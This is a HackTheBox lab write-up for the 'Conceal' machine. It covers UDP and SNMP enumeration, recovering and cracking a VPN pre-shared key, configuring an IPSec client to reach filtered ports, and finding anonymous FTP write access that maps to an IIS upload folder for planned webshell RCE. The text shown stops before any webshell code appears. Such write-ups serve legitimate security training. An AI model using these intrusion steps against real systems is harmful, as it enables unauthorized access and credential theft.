---
title: "HackTheBox Writeup: Conceal"
date: 2019-10-08T16:42:18+02:00
toc: true
showdate: true
tags:
  - hackthebox
  - ctf
  - writeup
---

Any box that lets me play around with networking configurations is a great learning experience for me, because I never had the opportunity to touch certain topics.

Conceal is one of these as it made me learn how IPSec VPNs work, how to enumerate them, and how to configure them from a Linux host to access the machine's actual ports, which were all looking filtered at first. Once figured out how to enumerate the box the difficult part is already over, all we need for the initial foothold is an ASP webshell to upload on FTP via anonymous access which is loaded from IIS, and from there privilege escalation can be done with RottenPotato and its children exploits (RottenPotatoNG, JuicyPotato...) to execute programs as SYSTEM because our user has the SeImpersonatePrivilege privilege enabled.

Overall, another very fun Windows challenge.

![img](/images/writeup-conceal/1.png)

---

## Looking for open ports

An initial standard nmap scan returns all ports as filtered, so it looks like we can't work with any TCP ports:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $sudo nmap -sV -sC -oA nmap 10.10.10.116
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-04 00:57 CEST
Nmap scan report for 10.10.10.116
Host is up (0.024s latency).
All 1000 scanned ports on 10.10.10.116 are filtered

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
```

So I switched to a UDP scan and even if very slowly I do find something open, which turn out to be SNMP and ISAKMP, a key exchange protocol:

```aaa
# Nmap 7.70 scan initiated Tue Sep  3 23:30:49 2019 as: nmap -sU -sV -oA nmap-udp 10.10.10.116
Nmap scan report for 10.10.10.116
Host is up (0.025s latency).
Scanned at 2019-09-03 23:30:50 CEST for 4991s

PORT      STATE         SERVICE           VERSION
[...]
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
158/udp   open|filtered pcmail-srv
161/udp   open          snmp              SNMPv1 server (public)
[...]
500/udp   open          isakmp            Microsoft Windows 8
[...]
Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows
```

I tried querying SNMP with *snmp-check*, using the default community string: "public" (community strings are the equivalent of passwords for the Simple Network Management Protocol):

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $snmp-check -h
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

Usage: snmp-check [OPTIONS] <target IP address>

  -p --port        : SNMP port. Default port is 161;
  -c --community   : SNMP community. Default is public;
  -v --version     : SNMP version (1,2c). Default is 1;

  -w --write       : detect write access (separate action by enumeration);

  -d --disable_tcp : disable TCP connections enumeration!
  -t --timeout     : timeout in seconds. Default is 5;
  -r --retries     : request retries. Default is 1;
  -i --info        : show script version;
  -h --help        : show help menu;
```

The default options already set the right community string and the version is correct as well so we only need to specify the target IP address to receive a lot of data back:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $snmp-check 10.10.10.116
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.10.116
  Hostname                      : Conceal
  Description                   : Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
  Location                      : -
  Uptime snmp                   : 08:07:36.32
  Uptime system                 : 08:07:11.97
  System date                   : 2019-9-3 22:46:42.6
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Destitute           
  Administrator       
  DefaultAccount      

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 264551
  TCP segments sent             : 8
  TCP segments retrans          : 4
  Input datagrams               : 702520
  Delivered datagrams           : 546672
  Output datagrams              : 4292

[*] Network interfaces:

  Interface                     : [ up ] Software Loopback Interface 1
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 1073 Mbps
  MTU                           : 1500
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IKEv2)
  Id                            : 2
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (PPTP)
  Id                            : 3
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
  Id                            : 4
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (L2TP)
  Id                            : 5
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Teredo Tunneling Pseudo-Interface
  Id                            : 6
  Mac Address                   : 00:00:00:00:00:00
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IP)
  Id                            : 7
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (SSTP)
  Id                            : 8
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IPv6)
  Id                            : 9
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection
  Id                            : 10
  Mac Address                   : 00:50:56:88:e7:e7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 29155608
  Out octets                    : 419387

  Interface                     : [ down ] WAN Miniport (PPPOE)
  Id                            : 11
  Mac Address                   : :::::
  Type                          : ppp
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (Network Monitor)
  Id                            : 12
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000
  Id                            : 13
  Mac Address                   : 00:50:56:88:e7:e7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 29155608
  Out octets                    : 419387

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000
  Id                            : 14
  Mac Address                   : 00:50:56:88:e7:e7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 29155608
  Out octets                    : 419387

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000
  Id                            : 15
  Mac Address                   : 00:50:56:88:e7:e7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 29155608
  Out octets                    : 419387


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  10                    10.10.10.116          255.255.255.0         1                   
  1                     127.0.0.1             255.0.0.0             1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.10.2            0.0.0.0               281                 
  10.10.10.0            10.10.10.116          255.255.255.0         281                 
  10.10.10.116          10.10.10.116          255.255.255.255       281                 
  10.10.10.255          10.10.10.116          255.255.255.255       281                 
  127.0.0.0             127.0.0.1             255.0.0.0             331                 
  127.0.0.1             127.0.0.1             255.255.255.255       331                 
  127.255.255.255       127.0.0.1             255.255.255.255       331                 
  224.0.0.0             127.0.0.1             240.0.0.0             331                 
  255.255.255.255       127.0.0.1             255.255.255.255       331                 

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               21                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49669                 0.0.0.0               0                     listen              
  0.0.0.0               49670                 0.0.0.0               0                     listen              
  10.10.10.116          139                   0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               123                 
  0.0.0.0               161                 
  0.0.0.0               500                 
  0.0.0.0               4500                
  0.0.0.0               5050                
  0.0.0.0               5353                
  0.0.0.0               5355                
  10.10.10.116          137                 
  10.10.10.116          138                 
  10.10.10.116          1900                
  10.10.10.116          52647               
  127.0.0.1             1900                
  127.0.0.1             52648               

[*] Network services:

  Index                 Name                
  0                     Power               
  1                     Server              
  2                     Themes              
  3                     IP Helper           
  4                     DNS Client          
  5                     Data Usage          
  6                     Superfetch          
  7                     DHCP Client         
  8                     Time Broker         
  9                     TokenBroker         
  10                    Workstation         
  11                    SNMP Service        
  12                    User Manager        
  13                    VMware Tools        
  14                    Windows Time        
  15                    CoreMessaging       
  16                    Plug and Play       
  17                    Print Spooler       
  18                    Windows Audio       
  19                    SSDP Discovery      
  20                    Task Scheduler      
  21                    Windows Search      
  22                    Security Center     
  23                    Storage Service     
  24                    Windows Firewall    
  25                    CNG Key Isolation   
  26                    COM+ Event System   
  27                    Windows Event Log   
  28                    IPsec Policy Agent  
  29                    Geolocation Service
  30                    Group Policy Client
  31                    RPC Endpoint Mapper
  32                    Data Sharing Service
  33                    Device Setup Manager
  34                    Network List Service
  35                    System Events Broker
  36                    User Profile Service
  37                    Base Filtering Engine
  38                    Local Session Manager
  39                    Microsoft FTP Service
  40                    TCP/IP NetBIOS Helper
  41                    Cryptographic Services
  42                    COM+ System Application
  43                    Diagnostic Service Host
  44                    Shell Hardware Detection
  45                    State Repository Service
  46                    Diagnostic Policy Service
  47                    Network Connection Broker
  48                    Security Accounts Manager
  49                    Network Location Awareness
  50                    Windows Connection Manager
  51                    Windows Font Cache Service
  52                    Remote Procedure Call (RPC)
  53                    DCOM Server Process Launcher
  54                    Windows Audio Endpoint Builder
  55                    Application Host Helper Service
  56                    Network Store Interface Service
  57                    Client License Service (ClipSVC)
  58                    Distributed Link Tracking Client
  59                    System Event Notification Service
  60                    World Wide Web Publishing Service
  61                    Connected Devices Platform Service
  62                    Windows Defender Antivirus Service
  63                    Windows Management Instrumentation
  64                    Windows Process Activation Service
  65                    Distributed Transaction Coordinator
  66                    IKE and AuthIP IPsec Keying Modules
  67                    Microsoft Account Sign-in Assistant
  68                    VMware CAF Management Agent Service
  69                    VMware Physical Disk Helper Service
  70                    Background Intelligent Transfer Service
  71                    Background Tasks Infrastructure Service
  72                    Program Compatibility Assistant Service
  73                    VMware Alias Manager and Ticket Service
  74                    Connected User Experiences and Telemetry
  75                    WinHTTP Web Proxy Auto-Discovery Service
  76                    Windows Defender Security Centre Service
  77                    Windows Push Notifications System Service
  78                    Windows Defender Antivirus Network Inspection Service
  79                    Windows Driver Foundation - User-mode Driver Framework

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     running               System Idle Process                                             
  4                     running               System                                                          
  100                   running               dllhost.exe           C:\Windows\system32\  /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
  312                   running               smss.exe                                                        
  400                   running               csrss.exe                                                       
  488                   running               wininit.exe                                                     
  500                   running               csrss.exe                                                       
  504                   running               svchost.exe           C:\Windows\system32\  -k LocalService     
  584                   running               winlogon.exe                                                    
  604                   running               services.exe                                                    
  636                   running               lsass.exe             C:\Windows\system32\                      
  716                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch       
  728                   running               fontdrvhost.exe                                                 
  736                   running               fontdrvhost.exe                                                 
  760                   running               svchost.exe           C:\Windows\system32\  -k netsvcs          
  836                   running               svchost.exe           C:\Windows\system32\  -k RPCSS            
  852                   running               vmacthlp.exe          C:\Program Files\VMware\VMware Tools\                      
  924                   running               dwm.exe                                                         
  972                   running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork
  1012                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1020                  running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted
  1076                  running               svchost.exe           C:\Windows\System32\  -k NetworkService   
  1132                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1164                  running               Memory Compression                                              
  1276                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1284                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted
  1416                  running               spoolsv.exe           C:\Windows\System32\                      
  1500                  running               NisSrv.exe                                                      
  1596                  running               svchost.exe           C:\Windows\system32\  -k appmodel         
  1680                  running               svchost.exe                                                     
  1792                  running               svchost.exe           C:\Windows\system32\  -k apphost          
  1804                  running               svchost.exe           C:\Windows\System32\  -k utcsvc           
  1828                  running               svchost.exe           C:\Windows\system32\  -k ftpsvc           
  1896                  running               SecurityHealthService.exe                                            
  1912                  running               snmp.exe              C:\Windows\System32\                      
  1952                  running               VGAuthService.exe     C:\Program Files\VMware\VMware Tools\VMware VGAuth\                      
  1960                  running               ManagementAgentHost.exe  C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\                      
  1972                  running               vmtoolsd.exe          C:\Program Files\VMware\VMware Tools\                      
  2008                  running               svchost.exe           C:\Windows\system32\  -k iissvcs          
  2024                  running               MsMpEng.exe                                                     
  2364                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted
  2512                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
  3104                  running               svchost.exe           C:\Windows\system32\  -k LocalSystemNetworkRestricted
  3200                  running               LogonUI.exe                                 /flags:0x0 /state0:0xa3ab0055 /state1:0x41c64e6d
  3308                  running               SearchIndexer.exe     C:\Windows\system32\  /Embedding          
  3468                  running               msdtc.exe             C:\Windows\System32\                      
  3848                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceAndNoImpersonation

[*] Storage information:

  Description                   : ["C:\\ Label:  Serial Number 9606be7b"]
  Device id                     : [#<SNMP::Integer:0x00005588a7eb4828 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00005588a82ea2a8 @value=4096>]
  Memory size                   : 59.51 GB
  Memory used                   : 10.63 GB

  Description                   : ["D:\\"]
  Device id                     : [#<SNMP::Integer:0x00005588a82e0780 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00005588a82dd3f0 @value=0>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes

  Description                   : ["Virtual Memory"]
  Device id                     : [#<SNMP::Integer:0x00005588a82d4d90 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00005588a82d2ab8 @value=65536>]
  Memory size                   : 3.12 GB
  Memory used                   : 775.38 MB

  Description                   : ["Physical Memory"]
  Device id                     : [#<SNMP::Integer:0x00005588a800c2c0 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00005588a8020f18 @value=65536>]
  Memory size                   : 2.00 GB
  Memory used                   : 669.06 MB


[*] File system information:

  Index                         : 1
  Mount point                   :
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 0

[*] Device information:

  Id                    Type                  Status                Descr               
  1                     unknown               running               Microsoft XPS Document Writer v4
  2                     unknown               running               Microsoft Print To PDF
  3                     unknown               running               Microsoft Shared Fax Driver
  4                     unknown               running               Unknown Processor Type
  5                     unknown               running               Unknown Processor Type
  6                     unknown               unknown               Software Loopback Interface 1
  7                     unknown               unknown               WAN Miniport (IKEv2)
  8                     unknown               unknown               WAN Miniport (PPTP)
  9                     unknown               unknown               Microsoft Kernel Debug Network Adapter
  10                    unknown               unknown               WAN Miniport (L2TP)
  11                    unknown               unknown               Teredo Tunneling Pseudo-Interface
  12                    unknown               unknown               WAN Miniport (IP)   
  13                    unknown               unknown               WAN Miniport (SSTP)
  14                    unknown               unknown               WAN Miniport (IPv6)
  15                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection
  16                    unknown               unknown               WAN Miniport (PPPOE)
  17                    unknown               unknown               WAN Miniport (Network Monitor)
  18                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer
  19                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-
  20                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer L
  21                    unknown               unknown               D:\                 
  22                    unknown               running               Fixed Disk          
  23                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)

[*] Software components:

  Index                 Name                
  1                     Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
  2                     VMware Tools        
  3                     Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161

[*] IIS server information:

  TotalBytesSentLowWord         : 0
  TotalBytesReceivedLowWord     : 0
  TotalFilesSent                : 0
  CurrentAnonymousUsers         : 0
  CurrentNonAnonymousUsers      : 0
  TotalAnonymousUsers           : 0
  TotalNonAnonymousUsers        : 0
  MaxAnonymousUsers             : 0
  MaxNonAnonymousUsers          : 0
  CurrentConnections            : 0
  MaxConnections                : 0
  ConnectionAttempts            : 0
  LogonAttempts                 : 0
  Gets                          : 0
  Posts                         : 0
  Heads                         : 0
  Others                        : 0
  CGIRequests                   : 0
  BGIRequests                   : 0
  NotFoundErrors                : 0
```

A lot of this data seems useless but there is some very useful information in between, for example we havev a list of what processes are running on the system, the running services, and also a list of open TCP and UDP ports, this tells us it's not true that the box has no open ports, they are protected by a VPN:

```aaa
[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               21                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49669                 0.0.0.0               0                     listen              
  0.0.0.0               49670                 0.0.0.0               0                     listen              
  10.10.10.116          139                   0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               123                 
  0.0.0.0               161                 
  0.0.0.0               500                 
  0.0.0.0               4500                
  0.0.0.0               5050                
  0.0.0.0               5353                
  0.0.0.0               5355                
  10.10.10.116          137                 
  10.10.10.116          138                 
  10.10.10.116          1900                
  10.10.10.116          52647               
  127.0.0.1             1900                
  127.0.0.1             52648               
```

Some of the TCP ports we are interested in are FTP (21), SMB (445), and HTTP (80). We know a VPN is in place because the "Contact" value says so itself:

```aaa
Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
```

This IKE (Internet Key Exchange) password looks like a hash and trying to crack it on [HashKiller](https://hashkiller.co.uk/Cracker) returns a clear text password and the encryption algorithm, which is NTLM, and the password turned out to be "Dudecake1!". Another thing to note is that judging from the open UDP ports, 500 and 4500, which belong to IKE, we can determine the kind of VPN needed to access the box is IPSec. We can use *ike-scan* to know more about the implementation of IKE running on the box, in this case -M just stands for "multi-line":

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $sudo ike-scan 10.10.10.116 -M
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.10.116    Main Mode Handshake returned
    HDR=(CKY-R=79caffa91ebb08c5)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
    VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
    VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
    VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
    VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
    VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
    VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

Ending ike-scan 1.9.4: 1 hosts scanned in 0.064 seconds (15.58 hosts/sec).  1 returned handshake; 0 returned notify
```

The information we obtained from this command in the SA (Security Association) field, together with the PSK (Pre-Shared Key) we have found on SNMP, are enough to let us configure an IPSec client to connect to the box and access those protected ports.

---

## Setting up IPSec and connecting via VPN

A common IPSec client for Linux is *strongswan*. After installing the program it's time to configure it. The first time to touch is /etc/ipsec.secrets, where we need to specify the PSK to use every time we want to connect to Conceal, so we use the following syntax taken from the *ipsec-secrets* man page:

```aaa
IPSEC.SECRETS(5)                                  strongSwan                                 IPSEC.SECRETS(5)

NAME
       ipsec.secrets - secrets for IKE/IPsec authentication

DESCRIPTION
       The  file  ipsec.secrets  holds a table of secrets.  These secrets are used by the strongSwan Internet
       Key Exchange (IKE) daemons pluto (IKEv1) and charon (IKEv2) to authenticate other hosts.

       It is vital that these secrets be protected.  The file should be owned by the super-user, and its per‐
       missions should be set to block all access by others.

       The file is a sequence of entries and include directives.  Here is an example.

              # /etc/ipsec.secrets - strongSwan IPsec secrets file
              192.168.0.1 %any : PSK "v+NkxY9LLZvwj4qCC2o/gGrWDF2d21jL"
```

Which becomes in our config file:

```aaa
# This file holds shared secrets or RSA private keys for authentication.

# RSA private key for this host, authenticating it to any other host
# which knows the public part.

# this file is managed with debconf and will contain the automatically created private key
include /var/lib/strongswan/ipsec.secrets.inc

10.10.10.116 %any : PSK "Dudecake1!"
```

Then the second and last file we need to modify is /eyc/ipsec.conf, where we must add a whole entry in the file like this, always by following the instructions specified from the man page of *ipsec.conf*:

```aaa
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration

config setup
        # strictcrlpolicy=yes
        # uniqueids = no

# Add connections here.

conn conceal
        type = transport
        keyexchange = ikev1
        left = 10.10.14.37
        leftprotoport = tcp
        right = 10.10.10.116
        rightprotoport = tcp
        authby = psk
        esp = 3des-sha1
        ike = 3des-sha1-modp1024
        ikelifetime = 8h
        auto = start
        fragmentation = yes
```

Now the IPSec VPN has been configured and we can establish a secure connection to Conceal:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $sudo ipsec start --nofork
[sudo] password di baud:
Starting strongSwan 5.7.2 IPsec [starter]...
00[DMN] Starting IKE charon daemon (strongSwan 5.7.2, Linux 4.19.0-parrot4-28t-amd64, x86_64)
00[CFG] loading ca certificates from '/etc/ipsec.d/cacerts'
00[CFG] loading aa certificates from '/etc/ipsec.d/aacerts'
00[CFG] loading ocsp signer certificates from '/etc/ipsec.d/ocspcerts'
00[CFG] loading attribute certificates from '/etc/ipsec.d/acerts'
00[CFG] loading crls from '/etc/ipsec.d/crls'
00[CFG] loading secrets from '/etc/ipsec.secrets'
00[CFG] expanding file expression '/var/lib/strongswan/ipsec.secrets.inc' failed
00[CFG]   loaded IKE secret for 10.10.10.116 %any
00[LIB] loaded plugins: charon aesni aes rc2 sha2 sha1 md5 mgf1 random nonce x509 revocation constraints pubkey pkcs1 pkcs7 pkcs8 pkcs12 pgp dnskey sshkey pem openssl fips-prf gmp agent xcbc hmac gcm attr kernel-netlink resolve socket-default connmark stroke updown counters
00[LIB] dropped capabilities, running as uid 0, gid 0
00[JOB] spawning 16 worker threads
charon (22272) started after 40 ms
08[CFG] received stroke: add connection 'conceal'
08[CFG] added configuration 'conceal'
16[CFG] received stroke: initiate 'conceal'
16[IKE] initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
16[ENC] generating ID_PROT request 0 [ SA V V V V V ]
16[NET] sending packet: from 10.10.14.37[500] to 10.10.10.116[500] (236 bytes)
03[NET] received packet: from 10.10.10.116[500] to 10.10.14.37[500] (208 bytes)
03[ENC] parsed ID_PROT response 0 [ SA V V V V V V ]
03[IKE] received MS NT5 ISAKMPOAKLEY vendor ID
03[IKE] received NAT-T (RFC 3947) vendor ID
03[IKE] received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
03[IKE] received FRAGMENTATION vendor ID
03[ENC] received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
03[ENC] received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
03[CFG] selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
03[ENC] generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
03[NET] sending packet: from 10.10.14.37[500] to 10.10.10.116[500] (244 bytes)
09[NET] received packet: from 10.10.10.116[500] to 10.10.14.37[500] (260 bytes)
09[ENC] parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
09[ENC] generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
09[NET] sending packet: from 10.10.14.37[500] to 10.10.10.116[500] (100 bytes)
10[NET] received packet: from 10.10.10.116[500] to 10.10.14.37[500] (68 bytes)
10[ENC] parsed ID_PROT response 0 [ ID HASH ]
10[IKE] IKE_SA conceal[1] established between 10.10.14.37[10.10.14.37]...10.10.10.116[10.10.10.116]
10[IKE] scheduling reauthentication in 28033s
10[IKE] maximum IKE_SA lifetime 28573s
10[ENC] generating QUICK_MODE request 1806754435 [ HASH SA No ID ID ]
10[NET] sending packet: from 10.10.14.37[500] to 10.10.10.116[500] (196 bytes)
11[NET] received packet: from 10.10.10.116[500] to 10.10.14.37[500] (188 bytes)
11[ENC] parsed QUICK_MODE response 1806754435 [ HASH SA No ID ID ]
11[CFG] selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
11[IKE] CHILD_SA conceal{1} established with SPIs c120de67_i d6a9f018_o and TS 10.10.14.37/32[tcp] === 10.10.10.116/32[tcp]
11[ENC] generating QUICK_MODE request 1806754435 [ HASH ]
11[NET] sending packet: from 10.10.14.37[500] to 10.10.10.116[500] (60 bytes)
12[NET] received packet: from 10.10.10.116[500] to 10.10.14.37[500] (76 bytes)
12[ENC] parsed QUICK_MODE response 1806754435 [ HASH N(INIT_CONTACT) ]
12[IKE] ignoring fourth Quick Mode message
```

---

## Enumeration: round 2 through IPSec

To verify that we can now access all the ports on the box we can connect to the FTP server and try anonymous credentials, which work but it looks like the server is empty:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $ftp 10.10.10.116
Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:baud): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp>
```

We can also test the connection by scanning Conceal again, this time by using a full open TCP scan (-sT) to complete the handshake instead of the default SYN scan (-sS) as a SYN scan over IPSec doesn't work:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $sudo nmap -sT -oA nmap-vpn 10.10.10.116
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-04 05:14 CEST
Nmap scan report for 10.10.10.116
Host is up (0.027s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds
```

Continuing to look at FTP uploading a test file works so we have write permissions:

```aaa
ftp> put test
local: test remote: test
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
7 bytes sent in 0.00 secs (220.5141 kB/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-04-19  02:25AM                    7 test
226 Transfer complete.
ftp>
```

Another interesting port is SMB but we cannot seem to access with a guest account:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $smbclient -L 10.10.10.116
Unable to initialize messaging context
Enter WORKGROUP\baud's password:
session setup failed: NT_STATUS_ACCESS_DENIED
```

So the next thing we can experiment with the web server on port 80 where resides a default IIS installation:

![img](/images/writeup-conceal/2.png)

With gobuster we can check if there are any directories and there appears to be only one, and judging from the name that's where we will find all the files we upload from FTP:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $gobuster dir -u http://10.10.10.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2>/dev/null
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.116
[+] Threads:        1000
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/04 13:34:54 Starting gobuster
===============================================================
/upload (Status: 301)
===============================================================
2019/09/04 13:35:43 Finished
===============================================================
```

So we can try uploading a bunch of files with common extensions that can give us RCE, for IIS two of the most common extensions are .aspx and .asp, however if we try uploading a .aspx file we get an error in the moment when we try to load the page:

![img](/images/writeup-conceal/3.png)

